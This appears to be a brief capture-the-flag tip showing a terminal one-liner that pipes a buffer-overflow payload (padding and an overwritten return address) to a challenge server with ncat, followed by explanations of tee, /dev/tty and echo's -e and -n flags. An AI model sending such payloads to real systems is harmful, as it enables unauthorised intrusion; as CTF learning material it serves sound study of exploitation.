For terminal based solution..

echo -en "AAAAAAsAABAAAAAnAACAAAAAAAAAAAAAAAAAEAAa\xa6\x11\x40\x00\x00\x00\x00\x00" | ncat <server ip> 1337 | tee /dev/tty

tee is a command that can duplex the output of one command and channel it into two files
/dev/tty referes to the output of the terminal

echo hi > /dev/tty
is essentially the same as
echo hi

ncat <server ip> 1337

-e enables encoding of bytes when input specifies \x 
-n removes the newline after the echo, which probably what you want
